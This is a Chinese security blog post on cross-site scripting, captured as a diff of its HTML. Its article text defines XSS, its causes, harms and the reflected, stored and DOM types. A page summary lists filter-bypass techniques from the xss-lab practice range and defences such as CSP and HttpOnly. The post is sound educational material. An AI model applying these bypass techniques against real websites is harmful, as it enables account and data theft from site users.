@@ -1,0 +1,700 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>XSS | Attackxu の Blog</title><meta name="keywords" content="XSS"><meta name="author" content="Attackxu"><meta name="copyright" content="Attackxu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="XSS"><meta name="application-name" content="XSS"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="XSS"><meta property="og:url" content="http://example.com/2025/05/27/XSS/index.html"><meta property="og:site_name" content="Attackxu の Blog"><meta property="og:description" content="定义跨站脚本攻击（一种客户端代码注入攻击）  攻击者往web页面中插入恶意代码，当受害者的浏览器加载网站时代码会执行  成因服务器对输入和输出没有做严格限制，导致攻击者构造的字符输出到前端时被浏览器执行当作有效代码解析执行从而产生了危害  输入可控，尝试把控制数据改为js代码，让浏览器解析执行  危"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="Attackxu"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="定义跨站脚本攻击（一种客户端代码注入攻击）  攻击者往web页面中插入恶意代码，当受害者的浏览器加载网站时代码会执行  成因服务器对输入和输出没有做严格限制，导致攻击者构造的字符输出到前端时被浏览器执行当作有效代码解析执行从而产生了危害  输入可控，尝试把控制数据改为js代码，让浏览器解析执行  危"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/05/27/XSS/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Attackxu","link":"链接: ","source":"来源: Attackxu の Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Attackxu の Blog',
+  title: 'XSS',
+  postAI: '',
+  pageFillDescription: '定义, 成因, 危害, 分类, 漏洞利用, 反射型, 1, 存储型, DOM型, 定义, DOM型XSS, 其他类型XSS, MXSS, UXSS, SVG-XSS, HTML-XSS, PDF-XSS, Flash-XSS（SWF-XSS）, Exif-XSS, 攻击流程, 反射型, 存储型, 常见事件处理程序, 常见测试代码, 防御, 开启CSP, 使用HttpOnly, XSS Filter, 输入过滤, 输出转义, 基于xss-lab的绕过, 闭合双引号, 实体化绕过（使用不被实体化的字符构造payload）, 实体化绕过, 使用其他标签闭合, 大小写绕过, 双写绕过, Unicode, Unicode+内容检测绕过, hidden参数传递数据, Referer参数传递数据, Ua参数传递数据, Cookie参数传递数据, exif-xss, ng-include, 空格被过滤（%0a绕过）, embed标签定义跨站脚本攻击一种客户端代码注入攻击攻击者往页面中插入恶意代码当受害者的浏览器加载网站时代码会执行成因服务器对输入和输出没有做严格限制导致攻击者构造的字符输出到前端时被浏览器执行当作有效代码解析执行从而产生了危害输入可控尝试把控制数据改为代码让浏览器解析执行危害能做的事情就能通过做钓鱼欺骗网站挂马身份盗用盗取网站用户信息垃圾信息发送劫持用户行为蠕虫分类反射性非持久型攻击相对于受害者来说是一次性的具体表现在受害者点击了含有恶意脚本的恶意代码并没有保存在目标网站而应用程序只是不加处理的把恶意脚本反射给受害者浏览器导致受害者浏览器执行了相应的脚本存储型应用程序通过请求获取不可信赖的数据在未检验数据是否符合代码的情况下便将其存入数据库下一次从数据库获取该数据时也未对其进行过滤页面再次执行代码持续攻击用户存储型漏洞大多出现在评论区留言板用户提交了包含代码的留言到数据库当目标用户查询留言时那些留言的内容会从服务器解析之后加载出来型不与后台服务器交互数据也属于反射性的一种通过操作前端输出的时候产生问题是一个平台和语言都中立的接口可以是程序和脚本能够动态访问和更新文档内容结构以及样式漏洞利用测试流程看输出想输入在哪里更改输入代码看执行标签过滤决定反射型代码在中文件内容浏览器访问当用户输入什么页面返回什么没有对用户输入进行过滤可以传入代码代码代码可以传入标签传入我们插入的代码可以让他出一个弹窗可以执行代码靶场演示我们在两个浏览器分别登录的两个不同用户攻击者构造将发送给受害者受害者点击后代码执行触发前提受害者登录网站点击恶意链接存储型靶场演示攻击者在留言板中插入代码存储到数据库中受害者每次访问都会出现弹窗只有从数据库把插入的代码删除才会停止型定义文档对象模型是和文档的编程接口定义了所有元素的对象和属性以及访问它们的方法是关于如何获取修改添加或删除元素的标准以树结构表达文档型不会与后台进行交互是完完全全的前端安全问题客户端的脚本程序可以通过动态地检查和修改页面内容并不与服务端进行交互而是从客户端获取中的数据如中数据并在本地执行其次浏览器用户可以操作中的一些对象如等当攻击者可以控制一些对象输入一些恶意代码而客户端的脚本并没有对用户的输入进行有效的过滤传入一些危险函数如等或直接输出到页面时就会导致型漏洞的存在浅析型靶场演示更改参数为代码其他类型变异型跨站点脚本是一种由处理方式引起的安全漏洞即使应用程序具有强大的过滤器来阻止传统的攻击仍可能潜入其中这是因为利用行为中的特殊性使数据清洗工具无法发现恶意元素现在基本没有现在也基本见不到是一种利用浏览器或者浏览器扩展漏洞来制造产生的条件并执行代码的一种攻击类型浏览器翻译功能导致语句被调用执行网站提前插入代码本身无害化但是经过该浏览器翻译功能一翻译就会触发这个代码类型文件可以理解为和类似的后缀图片格式打开之后还是一个图片是一种基于的二维矢量图格式和我们平常用的等图片格式所不同的是图像在放大或改变尺寸的情况下其图形质量不会有所损失并且我们可以使用任何的文本编辑器打开图片并且编辑它目前主流的浏览器都已经支持图片的渲染复现图片文件内容只需要插入即可将代码插入文件中上传文件代码被执行形成访问上传后的文件地址被解析执行复现创建加入动作通过文件上传获取直链直链地址访问后被触发创建空白向空白中插入表示打开的当前应用浏览器打开该代码执行在有文件上传的点时上传该获取上传文件路径访问即可触发还可以使用生成含有的创建一个新的文档添加一个新页面添加代码将新页面写入到新文档中反编译文件查找触发危险函数找可控参数访问触发一是指执行恶意那么为什么说呢是因为有可以调用的函数也就是可以和通信因此这些函数如果使用不当就会造成常见的可触发的危险函数有最多等等复现新建文件随便选一个动画模板进入代码区域写入攻击取参数调用中中的参数值回车看看能否正常显示设置好后点击发布设置发布即可实战中将我们制作好的文件上传访问文件给参数传参代码使代码执行如果没有文件上传点可以先进行目录扫描如果存在文件对文件下载使用进行逆向分析找函数这里就是这个变量我们对这个变量传参如果这里不是获取变量的值而是写死了用户不可控就无法利用可交换图像文件格式英语官方简称是专门为数码相机的照片设定的可以记录数码照片的属性信息和拍摄数据可使用鼠标右键进入属性页面查看部分信息复现有些网站有读取图片信息的功能当网站读取到的恶意的信息就会触发这个上面已经演示过了有些谷歌浏览器安装了插件而插件获取图片信息的时候没有过滤导致了代码的执行攻击流程反射型发送带有恶意脚本的链接用户点击了恶意链接访问了目标服务器网站将同正常页面返回到用户浏览器用户浏览器解析了网页中的恶意代码向恶意服务器发起请求黑客从自己搭建的恶意服务器中获取用户提交的信息存储型黑客在目标服务器上构造恶意脚本保存在数据库中用户在网站登录状态下访问了目标服务器查看了存在恶意脚本的页面网站将同正常页面返回到用户浏览器用户浏览器解析了网页中的恶意代码向恶意服务器发起请求黑客从自己搭建的恶意服务器中获取用户提交的信息常见事件处理程序常见测试代码图片加载错误时触发闭合多使用查看输入的内容显示在什么地方防御开启指的是内容安全策略为了缓解很大一部分潜在的跨站脚本问题浏览器的扩展程序系统引入了内容安全策略本质上是建立白名单规定了浏览器只能够执行特定来源的代码即使存在跨站脚本攻击漏洞也不会加载来源不明的第三方脚本的攻击都要加载外部内容开启之后无法加载外部资源只能加载本地源可以绕过的情况只有对方配置不正确有的文件中没有开启使用是加在上的一个标识用于告诉浏览器不要向客户端脚本或其他暴需当你在上设置标识后浏览器就会知到这是特殊的只能由服务器检索到所有来自客户端脚本的访问都会被禁止只对有限制里设置设置或代码引用开启的情况如何判断是否启用绕过页面太鸡肋现在网络环境实现不了遇到思路不获取采用方式钓鱼浏览器攻击框架等对一些特殊字符进行代码层过滤输入过滤对用户提交的数据进行有效性验证仅接受指定长度范国内并符合我们期望格式的的内容提交阻止或者忽略除此外的其他任何数据输出转义在变量输出到页面时可以使用编码或转义的方式来防御攻击把预定义的字符转换为实体可以将转义基于的绕过闭合双引号分析输入的内容被双引号带入绕过闭合实体化绕过使用不被实体化的字符构造使用了函数实体化一些字符但默认配置不过滤单引号构造单引号分析闭合单引号闭合后发现符号实体化标签为使用的触发事件绕过闭合单引号之后再进行绕过鼠标滑过输入框触发事件实体化绕过被过滤为空双引号没有被过滤使用双引号构造用触发事件绕过使用其他标签闭合分析被过滤为点击触发事件绕过大小写绕过被过滤也被过滤使用大小写绕过双写绕过被过滤为空双写绕过标签的都有过滤使用编码内容检测绕过不管输入什么参数都没有传入只有输入之后参数才会传进去猜测在传入之前会判断字符串中有没有加入只是为了绕过检测是一个无效的函数调用浏览器会忽略它继续执行参数传递数据源代码中多了这三行内容有三个输入框但是为隐藏了三个参数分别尝试只有当传参时代码中才会接收到参数值尝试构造发现会过滤使用事件触发并将改为点击按钮参数传递数据仍然是只有可以接收到参数修改发现接收返回值参数请求头参数尝试构造的闭合标签是我们想要的结果抓包之后再放包页面出现文本框触发事件参数传递数据发现代码中变成通过传递数据看是否能接收数据依旧只有能够接收这里谁接收都无所谓因为有我们抓包修改头内容构造出现文本框说明构造成功再抓包修改放包点击文本框按下键盘触发事件参数传递数据盲猜抓包果然中的值传递给变量修改值构造再抓包修改放包点击文本框按下键盘触发事件该关的网址已经被弃用无法复现参考空格被过滤绕过被写入标签中尝试闭合输入的被过滤为空双写大小写都不能绕过也不能绕过空格和时转译成用回车的编码代替空格标签不用闭合标签标签已经被弃用不复现后几题都是标签',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-05-27 19:18:40',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Attackxu の Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 1.05rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 1.05rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>2</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 1.05rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.05rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">41</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/XSS/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>XSS</span></a></span></div></div><h1 class="post-title" itemprop="name headline">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-05-27T11:12:28.000Z" title="发表于 2025-05-27 19:12:28">2025-05-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-27T11:18:40.672Z" title="更新于 2025-05-27 19:18:40">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为合肥"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>合肥</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/05/27/XSS/"><header><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a><a href="/tags/XSS/" tabindex="-1" itemprop="url">XSS</a><h1 id="CrawlerTitle" itemprop="name headline">XSS</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Attackxu</span><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:12:28.000Z" title="发表于 2025-05-27 19:12:28">2025-05-27</time><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:18:40.672Z" title="更新于 2025-05-27 19:18:40">2025-05-27</time></header><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p>跨站脚本攻击（一种客户端代码注入攻击）</p>
+<blockquote>
+<p>攻击者往web页面中插入恶意代码，当受害者的浏览器加载网站时代码会执行</p>
+</blockquote>
+<h1 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h1><p>服务器对<strong>输入和输出</strong>没有做严格限制，导致攻击者构造的字符输出到前端时被浏览器执行当作有效代码解析执行从而产生了危害</p>
+<blockquote>
+<p>输入可控，尝试把控制数据改为js代码，让浏览器解析执行</p>
+</blockquote>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><p>JavaScript能做的事情就能通过XSS做</p>
+<ol>
+<li>钓鱼欺骗</li>
+<li>网站挂马</li>
+<li>身份盗用</li>
+<li>盗取网站用户信息</li>
+<li>垃圾信息发送</li>
+<li>劫持用户web行为</li>
+<li>xss蠕虫</li>
+</ol>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ol>
+<li>反射性</li>
+</ol>
+<p>非持久型，攻击相对于受害者来说是一次性的，具体表现在受害者点击了含有恶意JS脚本的url，恶意代码并没有保存在目标网站，而web应用程序只是不加处理的把恶意脚本反射给受害者浏览器，导致受害者浏览器执行了相应的脚本</p>
+<ol start="2">
+<li>存储型</li>
+</ol>
+<p>应用程序通过web请求获取不可信赖的数据，在未检验数据是否符合xss代码的情况下，便将其存入数据库，下一次从数据库获取该数据时也未对其进行过滤，页面再次执行xss代码持续攻击用户。</p>
+<blockquote>
+<p>存储型XSS漏洞大多出现在评论区、留言板，用户提交了包含XSS代码的留言到数据库，当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来</p>
+</blockquote>
+<ol start="3">
+<li>DOM型</li>
+</ol>
+<p>不与后台服务器交互数据，也属于反射性的一种，通过dom操作前端输出的时候产生问题。</p>
+<blockquote>
+<p>DOM（Document Object Model），是一个平台和语言都中立的接口，可以是程序和脚本能够动态访问和更新文档内容、结构以及样式。</p>
+</blockquote>
